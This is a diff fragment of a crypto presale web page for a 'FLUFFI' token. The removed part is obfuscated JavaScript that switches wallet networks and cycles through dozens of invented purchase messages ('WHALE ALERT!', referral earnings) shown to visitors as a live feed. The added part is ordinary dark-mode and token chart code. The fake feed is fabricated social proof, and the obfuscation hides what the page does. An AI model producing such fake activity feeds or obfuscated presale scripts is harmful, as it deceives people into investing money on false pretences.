_0x4e55b5=_0x1bf7bf;if(!window[_0x4e55b5(0xa2)]){showNotification(_0x4e55b5(0x1c1),_0x4e55b5(0x1dd));return;}try{const _0x330e3c=NETWORKS[_0x5e62d7];try{await window[_0x4e55b5(0xa2)]['request']({'method':_0x4e55b5(0x27d),'params':[{'chainId':_0x330e3c[_0x4e55b5(0x11e)]}]}),showNotification('Switched\x20to\x20'+_0x330e3c['chainName'],_0x4e55b5(0x2fc)),updateUIForNetwork(_0x5e62d7);}catch(_0x2d954c){if(_0x2d954c[_0x4e55b5(0xb6)]===0x1326)try{await window['ethereum']['request']({'method':_0x4e55b5(0x110),'params':[{'chainId':_0x330e3c['chainId'],'chainName':_0x330e3c[_0x4e55b5(0x2a2)],'rpcUrls':[_0x330e3c['rpcUrl']],'nativeCurrency':_0x330e3c[_0x4e55b5(0x7a)],'blockExplorerUrls':[_0x330e3c['blockExplorerUrl']]}]}),showNotification(_0x330e3c[_0x4e55b5(0x2a2)]+'\x20added\x20successfully','success'),updateUIForNetwork(_0x5e62d7);}catch(_0x1e00d0){console['error'](_0x4e55b5(0x2e0),_0x1e00d0),showNotification(_0x4e55b5(0x2c8),_0x4e55b5(0x1dd));}else console['error'](_0x4e55b5(0x1e3),_0x2d954c),showNotification(_0x4e55b5(0x1fa),_0x4e55b5(0x1dd));}}catch(_0x4cc018){console[_0x4e55b5(0x1dd)](_0x4e55b5(0x2bc),_0x4cc018),showNotification(_0x4e55b5(0x161)+_0x4cc018[_0x4e55b5(0xc5)],'error');}}function handleSolanaNetwork(_0x405f7e){const _0x56d35b=_0x1bf7bf;showNotification(_0x56d35b(0x24b),_0x56d35b(0x282));const _0x2d6fed=_0x405f7e==='solana-mainnet'?_0x56d35b(0x2b9):_0x56d35b(0x11f);updateUIForNetwork(_0x405f7e,_0x2d6fed);}function updateUIForNetwork(_0xc85132,_0x104258=null){const _0x336562=_0x1bf7bf,_0x10b0b5=document[_0x336562(0x26f)](_0x336562(0x141)),_0xe66cb1=_0x10b0b5[_0x336562(0x9a)];for(let _0x38e3e8=0x0;_0x38e3e8<_0xe66cb1[_0x336562(0x185)];_0x38e3e8++){const [_0x3134ce]=parseChainCurrency(_0xe66cb1[_0x38e3e8]['value']);if(_0x3134ce===_0xc85132){_0x10b0b5[_0x336562(0x275)]=_0x38e3e8;const [,_0x5a367a]=parseChainCurrency(_0xe66cb1[_0x38e3e8]['value']);updateNetworkIndicator(_0xc85132,_0x5a367a);break;}}updateContractInfoForNetwork(_0xc85132);}function createNetworkIndicator(){const _0xa1abe4=_0x1bf7bf,_0x72ffaf=document[_0xa1abe4(0x2c9)](_0xa1abe4(0x1da));return _0x72ffaf['id']=_0xa1abe4(0xf7),_0x72ffaf[_0xa1abe4(0x15f)]=_0xa1abe4(0x251),_0x72ffaf['style']['cssText']=_0xa1abe4(0x29c),document['body'][_0xa1abe4(0x14f)](_0x72ffaf),_0x72ffaf;}function updateContractInfoForNetwork(_0x40fde5){const _0x3c8bcb=_0x1bf7bf;console['log'](_0x3c8bcb(0x203)+_0x40fde5);const _0x1d2f9a=document['getElementById']('contractAddress');_0x1d2f9a&&CONTRACT_ADDRESSES[_0x40fde5]&&(_0x1d2f9a[_0x3c8bcb(0x2db)]=CONTRACT_ADDRESSES[_0x40fde5]);}async function detectCurrentNetwork(){const _0x3e9cb8=_0x1bf7bf;if(!window['ethereum'])return;try{const _0x12a6dc=await window[_0x3e9cb8(0xa2)][_0x3e9cb8(0x90)]({'method':_0x3e9cb8(0x2b2)}),_0x388f4c=parseInt(_0x12a6dc,0x10)[_0x3e9cb8(0x2d0)]();updateUIForNetwork(_0x388f4c);}catch(_0x3fee7e){console[_0x3e9cb8(0x1dd)](_0x3e9cb8(0x124),_0x3fee7e);}}window['ethereum']&&window[_0x1bf7bf(0xa2)]['on'](_0x1bf7bf(0x89),_0x471d71=>{const _0x10d5c6=_0x1bf7bf,_0x48725a=parseInt(_0x471d71,0x10)[_0x10d5c6(0x2d0)](),_0x3cdf7d=NETWORKS[_0x48725a]?.[_0x10d5c6(0x2a2)]||_0x10d5c6(0x25e)+_0x48725a;updateUIForNetwork(_0x48725a),showNotification(_0x10d5c6(0x165)+_0x3cdf7d,_0x10d5c6(0x2fc)),detectAndSetNetwork();});function initializeLiveFeed(){const _0x11862d=_0x1bf7bf,_0x188d1e=document['getElementById'](_0x11862d(0x29e)),_0x3443df=[_0x11862d(0x2de),_0x11862d(0x2e3),_0x11862d(0x27c),_0x11862d(0x2ab),'🐋\x20User\x200xl4m...5n6\x20just\x20invested\x2045.2\x20AVAX\x20in\x20FLUFFI',_0x11862d(0x20f),_0x11862d(0x152),_0x11862d(0x1db),_0x11862d(0xf4),_0x11862d(0x1fe),_0x11862d(0x170),_0x11862d(0x26e),'🐋\x20User\x200xh8i...9j0\x20purchased\x202.8\x20ETH\x20of\x20FLUFFI\x20tokens',_0x11862d(0x11a),_0x11862d(0x179),_0x11862d(0x12d),_0x11862d(0x207),_0x11862d(0x27f),_0x11862d(0x80),_0x11862d(0xaf),_0x11862d(0x22d),_0x11862d(0xef),_0x11862d(0x267),_0x11862d(0x7c),_0x11862d(0x92),_0x11862d(0x2fa),'🐋\x20User\x200xu1v...2w3\x20purchased\x2012.4\x20BNB\x20of\x20FLUFFI',_0x11862d(0x22b),'🐋\x20User\x200xa7b...8c9\x20just\x20bought\x201.3\x20BNB\x20of\x20FLUFFI',_0x11862d(0x1a7),_0x11862d(0x214),_0x11862d(0x10d),_0x11862d(0x211),'🔥\x20User\x200xhu2...3w4\x20bought\x206.5\x20BNB\x20worth\x20of\x20FLUFFI',_0x11862d(0x184),'🚀\x20User\x200xjz8...9a0\x20joined\x20FLUFFI\x20presale\x20with\x202.1\x20ETH',_0x11862d(0x2bd),_0x11862d(0xeb),_0x11862d(0x1dc),'🚀\x20User\x200xne0...1f2\x20joined\x20with\x20185\x20AVAX\x20in\x20presale!',_0x11862d(0xa5),_0x11862d(0x1d3),_0x11862d(0x1b8),_0x11862d(0x2df),_0x11862d(0x2ee),_0x11862d(0xee),_0x11862d(0x1f1),_0x11862d(0xac),_0x11862d(0x2d2),_0x11862d(0x16f),'🎯\x20User\x200xyu3...4v5\x20earned\x2010%\x20bonus\x20from\x203\x20referrals!',_0x11862d(0x231),_0x11862d(0xd1),'💰\x20User\x200xbc2...3d4\x20earned\x2012,800\x20FLUFFI\x20from\x20referrals',_0x11862d(0x145),'💰\x20User\x200xdfg8...9h0\x20received\x203,450\x20FLUFFI\x20referral\x20tokens',_0x11862d(0x176),'💰\x20User\x200xfjk4...5l6\x20got\x207,600\x20FLUFFI\x20in\x20referral\x20earnings',_0x11862d(0xe8),_0x11862d(0x1b9),'🐋\x20WHALE\x20ALERT!\x20User\x200xino3...4p5\x20bought\x2048.7\x20AVAX\x20of\x20FLUFFI!','🚀\x20WHALE!\x20User\x200xjpq6...7r8\x20joined\x20with\x202.9\x20ETH\x20in\x20presale!',_0x11862d(0x84),_0x11862d(0x8f),_0x11862d(0x198),_0x11862d(0x2f9),_0x11862d(0x17b),_0x11862d(0x116),_0x11862d(0x229),_0x11862d(0x95)];let _0x4f7c0f=0x0;function _0x5b63db(){const _0x35e7e8=_0x11862d,_0x1b544e=document['createElement']('li');_0x1b544e['textContent']=_0x3443df[_0x4f7c0f%_0x3443df[_0x35e7e8(0x185)]],_0x1b544e[_0x35e7e8(0x15f)]=_0x35e7e8(0xa9),_0x188d1e[_0x35e7e8(0x130)](_0x1b544e);while(_0x188d1e[_0x35e7e8(0x21d)][_0x35e7e8(0x185)]>0x5){_0x188d1e[_0x35e7e8(0x25f)](_0x188d1e[_0x35e7e8(0x114)]);}_0x4f7c0f++;}for(let _0x3e5d30=0x0;_0x3e5d30<0x3;_0x3e5d30++){_0x5b63db();}setInterval(_0x5b63db,0x1f40);}document[_0x1bf7bf(0x10b)](_0x1bf7bf(0xdd),initializeLiveFeed);const feedMessages=[_0x1bf7bf(0x1e4),_0x1bf7bf(0x20c),_0x1bf7bf(0x131),_0x1bf7bf(0x1c0),_0x1bf7bf(0xc1),_0x1bf7bf(0x1f0),_0x1bf7bf(0x160),'🎯\x20User0xF22\x20invited\x203\x20friends\x20and\x20earned\x2030%\x20referral\x20bonus',_0x1bf7bf(0x1d4),_0x1bf7bf(0x10e),_0x1bf7bf(0x1ef),_0x1bf7bf(0x28d),_0x1bf7bf(0x197),'🚀\x20User0xB41\x20joined\x20with\x201.5\x20ETH\x20in\x20presale!',_0x1bf7bf(0x1c6),'🐋\x20User0xAA2\x20just\x20bought\x204.8\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀',_0x1bf7bf(0x182),_0x1bf7bf(0x1d9),_0x1bf7bf(0x19d),_0x1bf7bf(0x100),'🐋\x20User0xFE9\x20just\x20bought\x206.3\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀',_0x1bf7bf(0xa3),_0x1bf7bf(0x1c5),_0x1bf7bf(0x1d7),_0x1bf7bf(0xfa),'🐋\x20User0x223\x20just\x20bought\x200.9\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀',_0x1bf7bf(0xf5),_0x1bf7bf(0x153),_0x1bf7bf(0x241),_0x1bf7bf(0x106),_0x1bf7bf(0x259),'🔥\x20User0xCD9\x20staked\x20500,000\x20FLUFFI\x20and\x20is\x20farming\x20big\x20rewards!',_0x1bf7bf(0x105),'🚀\x20User0x77F\x20joined\x20with\x205\x20ETH\x20in\x20presale!','🐾\x20User0x2A2\x20bought\x20150,000\x20FLUFFI\x20tokens','🐋\x20User0x8DD\x20just\x20bought\x202.2\x20BNB\x20worth\x20of\x20FLUFFI\x20🚀',_0x1bf7bf(0x2b4),_0x1bf7bf(0x142),_0x1bf7bf(0x1a4),_0x1bf7bf(0x7f),_0x1bf7bf(0x257),_0x1bf7bf(0x28b),'🎯\x20User0x5E5\x20invited\x20a\x20friend\x20and\x20earned\x2010%\x20referral\x20bonus',_0x1bf7bf(0xb7),_0x1bf7bf(0x132),_0x1bf7bf(0x137),_0x1bf7bf(0x1ac),_0x1bf7bf(0x1ea),_0x1bf7bf(0x2e6),_0x1bf7bf(0x10c),_0x1bf7bf(0x19f),_0x1bf7bf(0x24e),'🎯\x20User0x33C\x20invited\x206\x20friends\x20and\x20earned\x2060%\x20referral\x20bonus',_0x1bf7bf(0x300),'🐾\x20User0x41F\x20bought\x20500,000\x20FLUFFI\x20tokens'];let feedIndex=0x0;function rotateFeed(){const _0x451fe3=_0x1bf7bf;document[_0x451fe3(0x26f)](_0x451fe3(0x1f6))[_0x451fe3(0x2db)]=feedMessages[feedIndex],feedIndex=(feedIndex+0x1)%feedMessages['length'];}setInterval(rotateFeed,0x1f40),rotateFeed();const customStyles=_0x1bf7bf(0x249);if(!document[_0x1bf7bf(0x26f)](_0x1bf7bf(0xfe))){const styleSheet=document['createElement'](_0x1bf7bf(0x2c2));styleSheet['id']=_0x1bf7bf(0xfe),styleSheet['textContent']=customStyles,document[_0x1bf7bf(0xdf)][_0x1bf7bf(0x14f)](styleSheet);}document[_0x1bf7bf(0x10b)]('DOMContentLoaded',function(){initializeTimer(),initTokenChart(),initializeLiveFeed(),updateStakingDashboard(),detectCurrentNetwork();function _0x592525(){const _0x52848b=_0x38e3;document['getElementById'](_0x52848b(0x222))[_0x52848b(0x2db)]=_0x52848b(0x20e),document[_0x52848b(0x26f)](_0x52848b(0x2e7))[_0x52848b(0x2db)]=_0x52848b(0x1d8),document[_0x52848b(0x26f)]('dc-count')['textContent']=_0x52848b(0x2d4);}_0x592525();});</script>
-<style>
-  .logo-float {
-    animation: float 3s ease-in-out infinite;
-  }
-  
-  @keyframes float {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-10px); }
-  }
-  
-  .section-title {
-    background: linear-gradient(90deg, #10B981, #059669);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-  }
-  
-  .wallet-modal {
-    display: none;
-    position: fixed;
-    z-index: 100;
-    left: 0;
-    top: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0,0,0,0.5);
-  }
-  
-  .wallet-modal.active {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  
-  .wallet-modal-content {
-    background-color: white;
-    padding: 20px;
-    border-radius: 12px;
-    width: 90%;
-    max-width: 400px;
-  }
-  
-  .wallet-option {
-    display: flex;
-    align-items: center;
-    padding: 12px;
-    margin: 10px 0;
-    border: 1px solid #e5e7eb;
-    border-radius: 8px;
-    cursor: pointer;
-    transition: all 0.2s;
-  }
-  
-  .wallet-option:hover {
-    background-color: #f9fafb;
-    border-color: #10B981;
-  }
-  
-  .wallet-option img {
-    width: 32px;
-    height: 32px;
-  }
-  
-  .wallet-help-btn {
-    width: 24px;
-    height: 24px;
-    border-radius: 50%;
-    background-color: #e5e7eb;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 14px;
-    cursor: help;
-  }
-  
-  .help-modal {
-    display: none;
-    position: fixed;
-    z-index: 1000;
-    left: 0;
-    top: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0,0,0,0.5);
-  }
-  
-  .help-modal.active {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  
-  .help-modal-content {
-    background-color: white;
-    padding: 24px;
-    border-radius: 12px;
-    width: 90%;
-    max-width: 500px;
-    max-height: 80vh;
-    overflow-y: auto;
-  }
-  
-  .help-close {
-    color: #aaa;
-    float: right;
-    font-size: 28px;
-    font-weight: bold;
-    cursor: pointer;
-  }
-  
-  .help-title {
-    display: flex;
-    align-items: center;
-    margin-bottom: 20px;
-    font-size: 18px;
-    font-weight: bold;
-  }
-  
-  .help-icon-wrapper {
-    width: 40px;
-    height: 40px;
-    border-radius: 50%;
-    background-color: #e5e7eb;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin-right: 12px;
-  }
-  
-  .help-icon {
-    font-size: 20px;
-    color: #10B981;
-  }
-  
-  .help-platform {
-    margin-bottom: 24px;
-  }
-  
-  .platform-header {
-    display: flex;
-    align-items: center;
-    margin-bottom: 12px;
-  }
-  
-  .platform-icon {
-    width: 32px;
-    height: 32px;
-    border-radius: 50%;
-    background-color: #e5e7eb;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    margin-right: 12px;
-  }
-  
-  .help-steps {
-    padding-left: 20px;
-  }
-  
-  .help-steps li {
-    margin-bottom: 8px;
-    line-height: 1.5;
-  }
-  
-  .price-tooltip {
-    position: relative;
-    display: inline-block;
-    cursor: help;
-  }
-  
-  .price-tooltip .tooltip-text {
-    visibility: hidden;
-    width: 200px;
-    background-color: #1f2937;
-    color: white;
-    text-align: center;
-    border-radius: 6px;
-    padding: 8px;
-    position: absolute;
-    z-index: 1;
-    bottom: 125%;
-    left: 50%;
-    transform: translateX(-50%);
-    opacity: 0;
-    transition: opacity 0.3s;
-    font-size: 12px;
-  }
-  
-  .price-tooltip:hover .tooltip-text {
-    visibility: visible;
-    opacity: 1;
-  }
-  
-  .wallet-address-display {
-    background-color: #10B981;
-    color: white;
-    padding: 8px 12px;
-    border-radius: 6px;
-    font-family: monospace;
-  }
-  
-  .disconnect-btn {
-    background-color: #ef4444;
-    color: white;
-    border: none;
-    padding: 8px 12px;
-    border-radius: 6px;
-    cursor: pointer;
-    margin-left: 8px;
-  }
-  
-  .disconnect-btn:hover {
-    background-color: #dc2626;
-  }
-</style>
+  </footer>
+
+  <script>
+    let tokenChart = null;
+    
+    document.addEventListener('DOMContentLoaded', function() {
+      // Set dark mode based on preference
+      const prefersDark = localStorage.getItem('darkMode') === 'true' || 
+                         (localStorage.getItem('darkMode') === null && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      
+      if (prefersDark) {
+        document.documentElement.classList.add('dark');
+        document.getElementById('darkModeIcon').textContent = '☀️';
+      } else {
+        document.documentElement.classList.remove('dark');
+        document.getElementById('darkModeIcon').textContent = '🌙';
+      }
+      
+      // Initialize token chart
+      initTokenChart();
+    });
+    
+    function toggleDarkMode() {
+      const html = document.documentElement;
+      html.classList.toggle('dark');
+      localStorage.setItem('darkMode', html.classList.contains('dark'));
+      const icon = document.getElementById('darkModeIcon');
+      icon.textContent = html.classList.contains('dark') ? '☀️' : '🌙';
+      
+      if (tokenChart) {
+        const isDark = html.classList.contains('dark');
+        tokenChart.options.plugins.legend.labels.color = isDark ? '#E2E8F0' : '#1F2937';
+        tokenChart.update();
+      }
+    }
+    
+    function initTokenChart() {
+      const ctx = document.getElementById('tokenChart');
+      if (!ctx) return;
+      
+      const isDark = document.documentElement.classList.contains('dark');
+      const data = {
+        labels: ['Liquidity (50%)', 'Community (30%)', 'Marketing (10%)', 'Team (10%)'],
+        datasets: [{
+          data: [50, 30, 10, 10],
+          backgroundColor: ['#10B981', '#3B82F6', '#F59E0B', '#8B5CF6'],
+          borderWidth: 0,
+          hoverOffset: 15
+        }]
+      };
+      
+      const config = {
+        type: 'doughnut',
+        data: data,
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          cutout: '65%',
+          plugins: {
+            legend: {
+              position: 'bottom',
+              labels: {
+                color: isDark ? '#E2E8F0' : '#1F2937',
+                font: {
+                  size: 14,
+                  family: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
+                },
+                padding: 20
+              }
+            },
+            tooltip: {
+              backgroundColor: isDark ? 'rgba(15, 23, 42, 0.9)' : 'rgba(255, 255, 255, 0.9)',
+              titleColor: isDark ? '#E2E8F0' : '#1F2937',
+              bodyColor: isDark ? '#E2E8F0' : '#1F2937',
+              titleFont: {
+                size: 16,
+                weight: 'bold'
+              },
+              bodyFont: {
+                size: 14
+              },
+              padding: 15,
+              cornerRadius: 12,
+              callbacks: {
+                label: function(context) {
+                  return context.label.split(' (')[0] + ': ' + context.parsed + '%';
+                }
+              }
+            }
+          },
+          animation: {
+            animateScale: true,
+            animateRotate: true,
+            duration: 2000,
+            easing: 'easeOutQuart'
+          }
+        }
+      };
+      
+      tokenChart = new Chart(ctx, config);
+      
+      // Update chart colors when dark mode changes
+      const observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          if (mutation.attributeName === 'class') {
+            const isDark = document.documentElement.classList.contains('dark');
+            tokenChart.options.plugins.legend.labels.color = isDark ? '#E2E8F0' : '#1F2937';
+            tokenChart.options.plugins.tooltip.backgroundColor = isDark ? 'rgba(15, 23, 42, 0.9)' : 'rgba(255, 255, 255, 0.9)';
+            tokenChart.options.plugins.tooltip.titleColor = isDark ? '#E2E8F0' : '#1F2937';
+            tokenChart.options.plugins.tooltip.bodyColor = isDark ? '#E2E8F0' : '#1F2937';
+            tokenChart.update();
+          }
+        });
+      });
+      
+      observer.observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['class']
+      });
+    }
+  </script>
 </body>
 </html>
